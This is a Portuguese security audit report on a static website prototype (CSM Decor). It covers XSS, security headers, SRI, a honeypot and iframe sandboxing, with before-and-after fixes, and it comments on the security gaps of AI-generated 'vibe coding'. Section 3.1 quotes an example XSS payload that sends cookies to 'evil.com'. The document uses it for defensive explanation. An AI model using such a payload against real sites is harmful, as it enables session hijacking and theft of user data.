Sumário Executivo

Foi realizada uma auditoria completa de segurança no protótipo estático do site CSM Decor (Fase 1). Foram identificadas 5 vulnerabilidades, sendo 1 classificada como crítica (XSS confirmado), 2 como altas (ausência de cabeçalhos HTTP de segurança e risco de clickjacking) e 2 como médias (scripts CDN sem verificação de integridade e formulários sem proteção contra bots). Todas as falhas foram corrigidas durante a mesma sessão de auditoria, sem necessidade de intervenção externa. O site está agora em conformidade com as boas práticas OWASP para aplicações web estáticas.

1. Contexto e Metodologia

A auditoria foi conduzida por revisão estática do código-fonte (HTML, CSS e JavaScript inline), com foco nas vulnerabilidades mais comuns em sites gerados via vibe coding — prática em que ferramentas de inteligência artificial geram código funcional sem necessariamente aplicar princípios de segurança.

O escopo incluiu análise de:

  • Manipulação de DOM com dados fornecidos pelo usuário (vetores de XSS)
  • Dependências externas carregadas via CDN sem verificação de integridade
  • Configuração de iframes e elementos de terceiros
  • Proteção dos formulários de contato e cadastro contra automação maliciosa
  • Cabeçalhos HTTP de segurança (auditados para configuração no deploy)
  • Exposição de credenciais ou dados sensíveis no código-fonte

Resultado positivo: Nenhuma credencial, chave de API ou token de autenticação foi encontrado exposto no código-fonte — uma boa prática já aplicada corretamente desde o início.

3. Análise Detalhada e Correções

3.1 XSS Refletido na Busca (Crítico)

Analogia didática

Imagine um atendente de banco que, ao receber um bilhete escrito pelo cliente, lê o conteúdo em voz alta para toda a agência — sem verificar se o bilhete contém instruções maliciosas. Se alguém escrever "gritem todos: acreditem em mim!", ele vai gritar. O XSS funciona da mesma forma: o site "lê em voz alta" para o browser qualquer coisa que o usuário escrever no campo de busca.

O que é XSS (Cross-Site Scripting): É uma vulnerabilidade onde o atacante consegue injetar código JavaScript malicioso em uma página web, que então é executado no navegador de outros usuários ou da própria vítima. É a vulnerabilidade web número 3 no ranking OWASP Top 10.

Onde estava: Nas funções de busca de index.html (linha 2606) e produtos.html (linha 5827), o texto digitado pelo usuário era inserido diretamente no DOM via innerHTML sem nenhuma sanitização:

❌ Antes — Vulnerável
li.innerHTML =
  'Sem resultados para "' +
  q + '"';

// q = input direto do usuário
// sem nenhum tratamento
✓ Depois — Seguro
li.innerHTML =
  'Sem resultados para "' +
  escHtml(q) + '"';

// escHtml() converte
// < → &lt; e > → &gt;

O que um atacante poderia fazer: Digitar na busca um payload como <img src=x onerror="document.location='evil.com?c='+document.cookie">. O browser interpretaria a tag, executaria o JavaScript e enviaria dados de sessão do usuário para o servidor do atacante.

A correção — função escHtml(): Criamos uma função que converte todos os caracteres especiais do HTML em suas entidades seguras antes de qualquer dado do usuário ser inserido no DOM:

function escHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')   // & → &amp;
    .replace(/</g, '&lt;')    // < → &lt; (tag destruída)
    .replace(/>/g, '&gt;')    // > → &gt;
    .replace(/"/g, '&quot;')  // " → &quot;
    .replace(/'/g, '&#39;');  // ' → &#39;
}

Com isso, o payload <img onerror=...> se torna o texto literal &lt;img onerror=...&gt; — visível na tela como texto inofensivo, mas jamais interpretado pelo browser como código.

3.2 Ausência de Cabeçalhos HTTP de Segurança (Alto)

Analogia didática

Um site sem cabeçalhos de segurança é como uma loja que abre a porta sem dar nenhuma instrução aos funcionários: sem regra sobre o que pode entrar, sem identificação obrigatória, sem câmera de segurança. O servidor entrega os arquivos sem orientar o browser sobre como se comportar de forma segura.

Cabeçalhos HTTP de segurança são instruções que o servidor envia junto com cada resposta, dizendo ao navegador como ele deve se comportar. O site não tinha nenhum configurado.

A correção: Criamos o arquivo vercel.json, que instrui a plataforma Vercel (utilizada no deploy) a adicionar os seguintes cabeçalhos automaticamente em todas as respostas:

X-Frame-Options: SAMEORIGIN

Impede que o site seja embutido em um iframe de outro domínio. Bloqueia ataques de clickjacking, onde uma página maliciosa sobrepõe o site invisível para enganar o usuário a clicar em botões sem saber.

X-Content-Type-Options: nosniff

Proíbe o browser de "adivinhar" o tipo de um arquivo. Sem isso, um arquivo .txt poderia ser interpretado como .html e executado, abrindo vetores de XSS via uploads.

Strict-Transport-Security

Força o uso de HTTPS por 2 anos (max-age=63072000). Mesmo que alguém acesse via http://, o browser redireciona automaticamente — protegendo contra ataques de interceptação (man-in-the-middle).

Referrer-Policy: strict-origin

Quando um usuário clica em um link externo (Instagram, WhatsApp), o cabeçalho Referer normalmente entrega a URL completa da página de origem. Com esta política, entrega apenas o domínio — sem vazar a URL da página específica.

Permissions-Policy

Desativa APIs do browser que o site não usa: câmera, microfone, geolocalização e pagamento. Mesmo que um script malicioso seja injetado, ele não conseguirá acessar esses recursos do dispositivo do usuário.

Content-Security-Policy (CSP)

A "lista de convidados" do site. Define exatamente de quais domínios podem vir scripts, estilos, fontes, imagens e frames. Qualquer recurso fora da lista é bloqueado automaticamente pelo browser.

3.3 Scripts CDN sem Subresource Integrity — SRI (Médio)

Analogia didática

Você confia no padeiro da esquina e toda manhã ele entrega o pão. Um dia, alguém intercep­ta a entrega e substitui o pão por um envenenado, mantendo a embalagem original. Você recebe, confia na embalagem e come. O SRI resolve isso colocando um lacre numerado na embalagem: se o número não bater, você não abre.

O site carregava três bibliotecas de CDN externo sem qualquer verificação de integridade: GSAP 3.12.5, ScrollTrigger 3.12.5 e animate.css 4.1.1 (todos do cdnjs.cloudflare.com).

Se o servidor do CDN fosse comprometido (um ataque supply chain), o arquivo poderia ser substituído por uma versão com código malicioso. O browser baixaria e executaria sem questionar — porque a URL é a mesma e o HTTPS apenas garante a transmissão, não a autenticidade do conteúdo.

A correção — atributo integrity: Adicionamos o hash SHA-512 de cada arquivo. O browser calcula o hash do arquivo recebido e compara com o declarado. Se diferirem em um único byte, o arquivo é bloqueado antes de executar:

<!-- ❌ Antes: sem verificação de integridade -->
<script src="cdnjs.../gsap.min.js"></script>

<!-- ✓ Depois: hash SHA-512 verificado -->
<script
  src="cdnjs.../gsap.min.js"
  integrity="sha512-7eHRwcb...qScg=="
  crossorigin="anonymous"
  referrerpolicy="no-referrer"
></script>

3.4 Formulários sem Proteção contra Bots — Honeypot (Médio)

Analogia didática

Um pote de mel escondido numa gaveta. Humanos não abrem gavetas que não estão sinalizadas. Mas formigas (bots) seguem qualquer rastro de comida e caem direto no pote. O honeypot identifica bots pelo comportamento — não por CAPTCHA, não por fricção para o usuário real.

Os 5 formulários do site (3 modais de cadastro e 2 no Fale Conosco) não tinham nenhuma proteção contra envios automatizados. Robôs de spam, ao escanear o HTML em busca de formulários, preenchem todos os campos visíveis e enviam — potencialmente inundando o e-mail contato@csmdecor.com.br com milhares de mensagens falsas.

A correção: Um campo _honey foi adicionado a cada formulário. Ele está completamente oculto via CSS para usuários humanos. Bots leem o HTML e o preenchem automaticamente. A função de envio verifica esse campo antes de qualquer outra ação:

<!-- No HTML: campo invisível para humanos -->
<input type="text" name="_honey"
  style="display:none!important"
  tabindex="-1" autocomplete="off" />

// No JavaScript: verificação antes de enviar
var honey = form.querySelector('[name="_honey"]');
if (honey && honey.value) return; // bot detectado → ignora

3.5 iframe Google Maps sem Sandbox (Médio)

Analogia didática

Um iframe sem sandbox é como contratar um prestador de serviço externo e dar a ele chaves de todas as salas do escritório. O sandbox é o crachá de acesso restrito: ele pode fazer o trabalho dele, mas só acessa as salas que você especificou.

Os dois iframes do Google Maps (index.html e fale-conosco.html) estavam sem o atributo sandbox, o que lhes permitia interagir com a página pai sem restrições, executar scripts com contexto mais amplo e potencialmente redirecionar a navegação principal.

A correção: Adicionamos sandbox com apenas as permissões mínimas necessárias para o mapa funcionar:

sandbox="allow-scripts           ← mapa carrega e interage
        allow-same-origin       ← tiles do Google carregam
        allow-popups            ← "Abrir no Maps" funciona
        allow-popups-to-escape-sandbox" ← popup sai do sandbox

O que não foi permitido e, portanto, está bloqueado por padrão: allow-forms (o iframe não pode submeter dados), allow-top-navigation (não pode redirecionar a página principal) e allow-modals (não pode abrir alertas).

4. O Problema Estrutural do Vibe Coding e Segurança

O vibe coding — uso de IA para gerar código com base em descrições em linguagem natural — produz resultados visualmente funcionais com velocidade notável. Porém, por padrão, os modelos de linguagem são otimizados para funcionalidade e aparência, não para segurança.

As falhas encontradas neste projeto são arquetípicas desse padrão:

  • XSS por innerHTML: A IA usa innerHTML porque é a forma mais rápida e legível de inserir conteúdo dinâmico. Não "pensa" em sanitização porque não foi explicitamente solicitado.
  • CDN sem SRI: A IA insere a tag de script mais simples possível. Adicionar integrity é um passo extra que ela não inclui a menos que instruída.
  • Sem cabeçalhos de segurança: Headers HTTP são invisíveis no HTML — a IA não os gera porque não estão no escopo visual do que foi pedido.
  • Sem honeypot: A IA cria formulários que "funcionam" — mas não considera o abuso como parte do escopo funcional padrão.

A solução não é abandonar o vibe coding, mas complementá-lo com revisões de segurança como esta — especialmente antes de qualquer deploy para produção.

6. Recomendações para a Fase 2 (Next.js)

As correções aplicadas aqui resolvem todas as vulnerabilidades identificáveis em uma aplicação estática. Quando o projeto migrar para Next.js na Fase 2, as seguintes práticas de segurança adicionais devem ser incorporadas desde o início:

  • Validação server-side: Todo dado recebido via API deve ser validado e sanitizado no servidor, nunca confiar apenas no frontend.
  • Autenticação real: O modal de cadastro com Google Login deverá ser implementado via NextAuth.js ou Supabase Auth — com tokens JWT e sessões seguras.
  • Rate limiting: Limitar o número de submissões de formulário por IP por intervalo de tempo (ex: 5 envios por hora), via Vercel Edge Middleware.
  • CSRF Protection: Tokens anti-CSRF em todos os formulários que realizam operações de escrita.
  • Variáveis de ambiente: Todas as chaves (Supabase, Google, WooCommerce API) devem residir em .env.local, nunca no código-fonte.
  • Auditoria de dependências: Executar npm audit regularmente e manter as dependências atualizadas.
  • Headers de CSP sem unsafe-inline: Na Fase 2, refatorar os scripts inline para arquivos externos, permitindo uma CSP mais restrita sem 'unsafe-inline'.
